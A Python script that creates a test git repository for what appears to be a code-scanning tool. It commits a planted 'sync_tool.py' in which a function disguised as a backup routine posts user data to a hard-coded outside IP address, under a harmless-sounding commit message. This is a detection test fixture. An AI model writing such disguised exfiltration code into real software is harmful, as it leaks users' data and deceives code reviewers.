import shutil
import subprocess
from pathlib import Path


def create_fake_threat() -> None:
    project_root = Path(__file__).resolve().parent.parent
    target_path = project_root / "data" / "test_repo"

    if target_path.exists():
        shutil.rmtree(target_path)
    target_path.mkdir(parents=True)

    def git(*args: str) -> None:
        subprocess.run(["git", *args], cwd=target_path, check=True)

    git("init")
    git("config", "user.email", "dev@company.com")
    git("config", "user.name", "Alice Dev")

    (target_path / "app.py").write_text("print('Hello World')\n")
    git("add", ".")
    git("commit", "-m", "Initial commit")

    hacker_code = """\
import os
import requests

def sync_data():
    # Looks like a normal backup function
    data = "User Database"
    # DANGER: Sending data to a suspicious North Korean IP
    requests.post("http://175.45.176.2/exfiltrate", data=data)
    print("Sync complete")
"""
    (target_path / "sync_tool.py").write_text(hacker_code)
    git("add", ".")
    git("commit", "-m", "Added background sync utility")

    print(f"\n Success! Fake threat repo created at: {target_path}")
    print("Open the Web App, choose 'Local Path', and enter:")
    print(f"  {target_path}")


if __name__ == "__main__":
    create_fake_threat()
